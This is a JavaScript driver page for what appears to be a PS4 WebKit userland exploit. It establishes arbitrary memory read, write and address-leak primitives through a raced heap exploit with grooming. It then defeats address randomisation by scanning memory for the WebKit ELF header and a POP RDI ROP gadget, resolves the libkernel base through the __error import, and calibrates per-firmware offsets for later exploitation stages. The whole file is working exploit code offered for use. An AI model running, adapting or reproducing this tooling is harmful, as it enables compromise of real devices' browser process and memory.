import { int64 } from "./int64.js";
import { offsetsFor, offsetsForKey } from "./ps4_offsets_userland.js";

let outEl, stateEl, fwSelect, attemptsSelect;
let btnEstablish, btnOffsets, btnCalibrate, btnAll, btnClear, btnLowMem;

const params = new URLSearchParams(location.search);
const lines = [];
let passCount = 0;
let failCount = 0;
let busy = false;
let primitiveDone = false;
let exploit = null;
let calibratedOff = null;

const CORE_LOG = /FAIL|ERROR|THREW|RETRY|ABORT|PASS|GIVE-UP|ATTEMPT|SSV-|AUTO-RETRY|CORE-GIVE|COMPOSITION|PRIMITIVE/i;
const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS|GIVE-UP/i;

const SCAN_MAX_DELTA = 0x03000000;
const SCAN_YIELD_EVERY = 16;

function mark(tag, detail) {
    if (!outEl) return;
    const line = tag + (detail == null || detail === "" ? "" : "  " + detail);
    lines.push(line);
    const esc = t => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
    outEl.innerHTML = lines.map(l => esc(l)).join("\n");
    outEl.scrollTop = outEl.scrollHeight;
}

function state(msg, cls) {
    if (!stateEl) return;
    stateEl.textContent = msg;
    stateEl.className = cls || "";
}

function clearLog() {
    lines.length = 0;
    passCount = 0;
    failCount = 0;
    if (outEl) outEl.innerHTML = "";
}

function resolvedOffKey() {
    const pick = fwSelect.value;
    if (pick === "auto") {
        const detected = offsetsFor(navigator.userAgent);
        return detected.key || "13.00";
    }
    return pick;
}

function effectiveOff() {
    const offKey = resolvedOffKey();
    const { off } = offsetsForKey(offKey);
    if (!off) return null;
    if (calibratedOff)
        return Object.assign({}, off, calibratedOff);
    return off;
}

function crossFw(offKey) {
    const detected = offsetsFor(navigator.userAgent);
    return detected.key && detected.key !== offKey;
}

function setUi() {
    if (!btnEstablish) return;
    const hasP = !!window.p;
    btnEstablish.disabled = busy || primitiveDone;
    btnOffsets.disabled = busy || !hasP;
    btnCalibrate.disabled = busy || !hasP;
    btnAll.disabled = busy || primitiveDone;
    btnClear.disabled = busy;
    fwSelect.disabled = busy || primitiveDone;
    if (attemptsSelect) attemptsSelect.disabled = busy || primitiveDone;
}

async function breathe(i) {
    if (i > 0 && (i % SCAN_YIELD_EVERY) === 0)
        await new Promise(r => setTimeout(r, 0));
}

async function withBusy(fn) {
    if (busy) return;
    busy = true;
    setUi();
    try {
        await fn();
    } finally {
        busy = false;
        setUi();
    }
}

async function loadExploit() {
    if (exploit) return exploit;
    mark("LOAD", "importing core.js + mem.js...");
    const core = await import("./core.js");
    const mem = await import("./mem.js");
    exploit = {
        establishPrimitive: core.establishPrimitive,
        installWindowP: mem.installWindowP,
        pairStatus: mem.pairStatus
    };
    mark("LOAD-OK", "exploit modules ready");
    return exploit;
}

function check(name, ok, detail) {
    if (ok) {
        passCount++;
        mark("PASS", name + (detail ? "  " + detail : ""));
    } else {
        failCount++;
        mark("FAIL", name + (detail ? "  " + detail : ""));
    }
    return ok;
}

function same64(a, b) {
    return a.low === b.low && a.hi === b.hi;
}

function alignedWebkitBase(v) {
    return v.hi > 0 && (v.low & 0x3fff) === 0;
}

function plausibleLibkernelBase(v) {
    return v.hi > 0 && v.low !== 0;
}

function plausibleUserPtr(v) {
    if (!v || typeof v !== "object" || !("low" in v)) return false;
    const hi = v.hi >>> 0;
    const lo = v.low >>> 0;
    if (hi === 0 || hi > 0xffff) return false;
    if (lo === 0 && hi === 0) return false;
    return true;
}

function safeRead8(p, addr) {
    if (!plausibleUserPtr(addr)) return null;
    try {
        return p.read8(addr);
    } catch (_) {
        return null;
    }
}

function safeRead4(p, addr) {
    if (!plausibleUserPtr(addr)) return null;
    try {
        return p.read4(addr);
    } catch (_) {
        return null;
    }
}

function nativeExpm1Quiet(p, mFunctionOff) {
    const cell = p.leakval(Math.expm1);
    const mid = safeRead8(p, cell.add32(0x18));
    if (!mid) return null;
    return safeRead8(p, mid.add32(mFunctionOff));
}

async function findWebkitBaseElf(p, nativeFn) {
    if (!plausibleUserPtr(nativeFn)) return null;
    let delta = nativeFn.low & 0x3fff;
    let steps = 0;
    for (; delta < SCAN_MAX_DELTA; delta += 0x4000) {
        await breathe(steps++);
        const base = nativeFn.sub32(delta);
        if (!alignedWebkitBase(base)) continue;
        const magic = safeRead4(p, base);
        if (magic === 0x464c457f)
            return { base, wk_expm1_builtin: delta, via: "elf" };
    }
    return null;
}

async function findWebkitBaseGadget(p, nativeFn, gadgetRva) {
    if (!plausibleUserPtr(nativeFn) || !gadgetRva) return null;
    let delta = nativeFn.low & 0x3fff;
    let steps = 0;
    for (; delta < SCAN_MAX_DELTA; delta += 0x4000) {
        await breathe(steps++);
        const base = nativeFn.sub32(delta);
        if (!alignedWebkitBase(base)) continue;
        const g = safeRead4(p, base.add32(gadgetRva));
        if (g != null && (g & 0xffff) === 0xc35f)
            return { base, wk_expm1_builtin: delta, via: "gadget" };
    }
    return null;
}

async function findWebkitBase(p, nativeFn, off) {
    const elf = await findWebkitBaseElf(p, nativeFn);
    if (elf) return elf;
    const gadgetRva = off && off.wk_POP_RDI_RET;
    if (gadgetRva) {
        mark("CAL-SCAN", "ELF miss — POP_RDI @ 0x" + gadgetRva.toString(16));
        return findWebkitBaseGadget(p, nativeFn, gadgetRva);
    }
    return null;
}

async function findErrorImport(p, webkitBase, hintRva) {
    if (!plausibleUserPtr(webkitBase) || !hintRva) return null;
    const hi = webkitBase.hi;
    const start = Math.max(0, hintRva - 0x80000);
    const end = hintRva + 0x80000;
    let steps = 0;
    for (let rva = start; rva < end; rva += 0x10) {
        await breathe(steps++);
        const ptr = safeRead8(p, webkitBase.add32(rva));
        if (!ptr || ptr.hi <= hi || ptr.hi > hi + 4) continue;
        for (const kErr of [0x26420, 0xd9d0, 0x3370]) {
            const lk = ptr.sub32(kErr);
            if (!plausibleLibkernelBase(lk)) continue;
            const w0 = safeRead4(p, lk);
            const w1 = safeRead4(p, lk.add32(4));
            if (w0 == null || w1 == null) continue;
            if ((w0 & 0xff) === 0xb8 && (w1 & 0xffff) === 0x050f)
                return { wk___imp___error: rva, k__error: kErr, libkernelBase: lk };
        }
    }
    return null;
}

function computeBases(p, off) {
    if (!off || !off.wk_expm1_builtin) return null;
    const nativeFn = nativeExpm1Quiet(p, off.wk_JSFunction_m_function || 0x28);
    if (!nativeFn) return { error: "nativeFn unreadable" };
    const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
    if (!off.wk___imp___error || !off.k__error)
        return { nativeFn, webkitBase, libkernelBase: null };
    const errorFn = safeRead8(p, webkitBase.add32(off.wk___imp___error));
    if (!errorFn)
        return { nativeFn, webkitBase, libkernelBase: null, error: "error import unreadable" };
    const libkernelBase = errorFn.sub32(off.k__error);
    return { nativeFn, webkitBase, libkernelBase, errorFn };
}

function verifyBases(p, off, checkOffset) {
    const b = computeBases(p, off);
    if (!b) {
        checkOffset("module-bases", false, "no offset table");
        return false;
    }
    if (b.error && !b.libkernelBase) {
        mark("BASES", "webkit=" + b.webkitBase + " nativeFn=" + b.nativeFn
            + " (" + b.error + ")");
        checkOffset("module-bases-webkit-aligned", alignedWebkitBase(b.webkitBase), "");
        checkOffset("module-bases-libkernel", false, b.error);
        return false;
    }
    mark("BASES", "webkit=" + b.webkitBase + " libkernel=" + b.libkernelBase
        + " nativeFn=" + b.nativeFn);
    const wkOk = alignedWebkitBase(b.webkitBase);
    const lkOk = b.libkernelBase
        ? (alignedWebkitBase(b.libkernelBase) || plausibleLibkernelBase(b.libkernelBase))
        : false;
    checkOffset("module-bases-webkit-aligned", wkOk, "");
    if (b.libkernelBase)
        checkOffset("module-bases-libkernel-plausible", lkOk, "");
    return wkOk && lkOk;
}

function bufAddr(p, off, ab) {
    const cell = p.leakval(ab);
    const impl = safeRead8(p, cell.add32(off.wk_ArrayBuffer_m_impl));
    if (!impl) return null;
    return safeRead8(p, impl.add32(off.wk_ArrayBuffer_m_contents_m_data));
}

async function calibrateOffsets(p, tableOff) {
    mark("CALIBRATE", "light scan (yields to avoid OOM)");
    const mFunctionOff = tableOff.wk_JSFunction_m_function || 0x28;
    const nativeFn = nativeExpm1Quiet(p, mFunctionOff);
    if (!nativeFn) {
        mark("CALIBRATE-FAIL", "Math.expm1 native pointer unreadable");
        return null;
    }
    mark("CAL-NATIVEFN", String(nativeFn));

    const wk = await findWebkitBase(p, nativeFn, tableOff);
    if (!wk) {
        mark("CALIBRATE-FAIL", "webkit base not found (ELF + gadget)");
        return null;
    }
    mark("CAL-VIA", wk.via);
    mark("CAL-WK-BASE", String(wk.base));
    mark("CAL-wk_expm1_builtin", "0x" + wk.wk_expm1_builtin.toString(16));

    mark("CALIBRATE", "scanning __imp___error (narrow window)...");
    const err = await findErrorImport(p, wk.base, tableOff.wk___imp___error);
    if (err) {
        mark("CAL-wk___imp___error", "0x" + err.wk___imp___error.toString(16));
        mark("CAL-k__error", "0x" + err.k__error.toString(16));
        mark("CAL-LK-BASE", String(err.libkernelBase));
    } else {
        mark("CALIBRATE-WARN", "__imp___error not found — webkit base still valid");
    }

    const live = Object.assign({
        fw_status: "calibrated on hardware",
        wk_JSFunction_m_function: mFunctionOff,
        wk_expm1_builtin: wk.wk_expm1_builtin,
        wk_ArrayBuffer_m_impl: tableOff.wk_ArrayBuffer_m_impl,
        wk_ArrayBuffer_m_contents_m_data: tableOff.wk_ArrayBuffer_m_contents_m_data,
    }, err || {});

    calibratedOff = live;
    mark("CALIBRATE-STORED", "step 2 will use calibrated wk_*");

    mark("CALIBRATE", "verify with live offsets...");
    let offsetFail = 0;
    const checkOffset = (name, ok, detail) => {
        if (ok) passCount++; else { failCount++; offsetFail++; }
        mark(ok ? "PASS" : "FAIL", name + (detail ? "  " + detail : ""));
    };
    verifyBases(p, live, checkOffset);

    return live;
}

function logBootInfo() {
    const detected = offsetsFor(navigator.userAgent);
    mark("UA", navigator.userAgent);
    mark("UA-FW", detected.key || "unknown");
    mark("BOOT", "order: 1 primitive -> 3 calibrate -> 2 verify (step 2 is lite)");
    if (params.has("g"))
        mark("BOOT", "groom override: " + params.getAll("g").join(", "));
}

function maxAttemptsPick() {
    const fromUrl = parseInt(params.get("attempts") || "", 10);
    if (fromUrl > 0) return fromUrl;
    if (attemptsSelect) return parseInt(attemptsSelect.value, 10) || 3;
    return 3;
}

async function runEstablish() {
    if (primitiveDone) {
        mark("SKIP", "primitive already established this page");
        return;
    }

    const { establishPrimitive, installWindowP, pairStatus } = await loadExploit();
    const maxAttempts = maxAttemptsPick();

    state("establishing primitive...", "warn");
    mark("STEP", "1 - get primitive");
    mark("ATTEMPTS", String(maxAttempts));

    let carrier;
    try {
        carrier = await establishPrimitive({
            maxAttempts,
            onEvent: (t, d, a) => (CORE_LOG.test(t) ? mark : () => {})
                (t, (a != null ? "[" + a + "] " : "") + (d || ""))
        });
    } catch (err) {
        if (/gave up/i.test(String(err.message))) {
            mark("HINT", "race lost — close browser, reopen, tries=3");
        }
        throw err;
    }

    installWindowP(carrier, {
        promote: false,
        onEvent: (t, d) => (PRIMITIVE_LOUD.test(t) ? mark : () => {})(t, d || "")
    });

    const p = window.p;
    if (!p) throw new Error("window.p was not installed");

    primitiveDone = true;
    calibratedOff = null;
    mark("PAIR-STATUS", "state=" + pairStatus.state + " promoted=" + pairStatus.promoted);
    mark("PRIMITIVE-OK", "window.p read/write/leakval live");

    const boxA = { tag: "A" };
    const boxB = { tag: "B" };
    const addrA = p.leakval(boxA);
    const addrB = p.leakval(boxB);
    check("leakval-distinct",
        !same64(addrA, addrB) && addrA.low !== 0 && addrB.low !== 0,
        "a=" + addrA + " b=" + addrB);

    const headerA = p.read8(addrA);
    p.write8(addrA, headerA);
    check("read8-write8-roundtrip-header", same64(p.read8(addrA), headerA), "");

    state("primitive OK — run step 3 next", "ok");
    mark("READY", "calibrate before offset tests (step 2 is heavy if skipped)");
}

async function runOffsetTests() {
    const p = window.p;
    if (!p) throw new Error("run step 1 first");

    const offKey = resolvedOffKey();
    const off = effectiveOff();
    if (!off) throw new Error("no offset table for fw=" + offKey);

    mark("STEP", "2 - offset tests (lite)");
    mark("OFFSETS-FW", offKey);
    mark("OFFSETS-SRC", calibratedOff ? "calibrated" : "table (run step 3 first for BASES)");
    if (crossFw(offKey) && !calibratedOff)
        mark("NOTE", "table RVAs may not match UA firmware");

    state("offset tests...", "warn");
    await new Promise(r => setTimeout(r, 0));

    let offsetFail = 0;
    const checkOffset = (name, ok, detail) => {
        if (ok) {
            passCount++;
            mark("PASS", name + (detail ? "  " + detail : ""));
        } else {
            failCount++;
            offsetFail++;
            mark("FAIL", name + (detail ? "  " + detail : ""));
        }
        return ok;
    };

    const probe = new ArrayBuffer(0x20);
    const view = new Uint32Array(probe);
    view[0] = 0xdeadbeef;

    const dataPtr = bufAddr(p, off, probe);
    if (!dataPtr) {
        checkOffset("arraybuffer-backing", false, "bufAddr failed — impl chain wrong");
    } else {
        const got = safeRead4(p, dataPtr);
        checkOffset("arraybuffer-read4",
            got === 0xdeadbeef,
            "got=" + (got == null ? "null" : "0x" + got.toString(16)));
        if (got === 0xdeadbeef) {
            p.write4(dataPtr, new int64(0x13371337, 0));
            checkOffset("arraybuffer-write4", view[0] === 0x13371337, "");
        }
    }

    if (!calibratedOff) {
        mark("SKIP-BASES", "run step 3 calibrate first for module base checks");
    } else {
        verifyBases(p, off, checkOffset);
    }

    const summary = passCount + " pass, " + failCount + " fail";
    state("offset tests done — " + summary, offsetFail ? "warn" : "ok");
    mark("DONE-OFFSETS", summary);
}

async function runCalibrate() {
    const p = window.p;
    if (!p) throw new Error("run step 1 first");

    const offKey = resolvedOffKey();
    const { off } = offsetsForKey(offKey);
    if (!off) throw new Error("no offset table for fw=" + offKey);

    mark("STEP", "3 - calibrate wk_*");
    state("calibrating...", "warn");

    const live = await calibrateOffsets(p, off);
    if (live && live.wk_expm1_builtin != null) {
        mark("PASTE-OFFSETS", JSON.stringify(live, null, 0));
    }

    state("calibrate done — run step 2", "ok");
    mark("DONE-CALIBRATE", "");
}

function wireButton(el, handler) {
    if (!el) return;
    el.addEventListener("click", () => {
        withBusy(async () => {
            try {
                await handler();
            } catch (err) {
                state("error: " + err.message, "bad");
                mark("ERROR", err.stack || err.message);
            }
        });
    });
}

function init() {
    outEl = document.getElementById("out");
    stateEl = document.getElementById("state");
    fwSelect = document.getElementById("fw-select");
    attemptsSelect = document.getElementById("attempts-select");
    btnEstablish = document.getElementById("btn-establish");
    btnOffsets = document.getElementById("btn-offsets");
    btnCalibrate = document.getElementById("btn-calibrate");
    btnAll = document.getElementById("btn-all");
    btnClear = document.getElementById("btn-clear");
    btnLowMem = document.getElementById("btn-lowmem");

    if (!outEl || !btnEstablish) {
        state("UI missing — host via HTTP, open index.html", "bad");
        return;
    }

    wireButton(btnEstablish, runEstablish);
    wireButton(btnOffsets, runOffsetTests);
    wireButton(btnCalibrate, runCalibrate);
    wireButton(btnAll, async () => {
        await runEstablish();
        await new Promise(r => setTimeout(r, 100));
        await runCalibrate();
    });

    btnClear.addEventListener("click", () => {
        if (busy) return;
        clearLog();
        logBootInfo();
        state(primitiveDone ? "primitive OK — pick a test" : "ready", primitiveDone ? "ok" : "");
    });

    btnLowMem.addEventListener("click", () => {
        const url = new URL(location.href);
        url.searchParams.set("g", "drain:384");
        location.href = url.toString();
    });

    if (params.get("fw") && fwSelect.querySelector('option[value="' + params.get("fw") + '"]'))
        fwSelect.value = params.get("fw");
    if (params.get("attempts") && attemptsSelect)
        attemptsSelect.value = params.get("attempts");

    state("ready — tap step 1", "");
    logBootInfo();
    setUi();
}

try {
    init();
} catch (err) {
    state("init error: " + err.message, "bad");
    mark("ERROR", err.stack || err.message);
}
